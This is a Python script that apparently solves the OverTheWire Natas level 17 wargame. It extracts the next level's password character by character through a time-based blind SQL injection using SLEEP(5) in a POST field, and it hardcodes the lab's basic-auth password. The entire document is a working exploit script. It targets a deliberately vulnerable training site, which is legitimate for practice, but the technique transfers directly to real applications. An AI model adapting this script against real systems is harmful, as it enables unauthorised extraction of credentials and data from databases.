import requests
from requests.auth import HTTPBasicAuth

URL = "http://natas17.natas.labs.overthewire.org/index.php"
CHARACTER_LIST = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
auth = HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')

password_str = ""
i = 1
while True:
    # Since there are only 64 characters in the column, we will be this loop for 64 times only
    for character in CHARACTER_LIST:
        guess_str = password_str + character
        sqli_query = f" \" OR (username = \"natas18\"  AND IF(SUBSTRING(password, 1, {i}) = BINARY \"{guess_str}\", SLEEP(5) ,1)) -- "
        print(f"SQLi payload: {sqli_query}")
        data = {'username' : sqli_query}
        r = requests.post(url = URL, data = data, auth= auth)
        print(f"Time it took for response with character {character}: {r.elapsed.total_seconds()}")
        if (r.elapsed.total_seconds() >= 5.0):
            print(f"Guess character {character} caused the query to finish in more time than expected")
            password_str += character
            i += 1
            break
    if len(password_str) == 32:
        break

print(password_str)
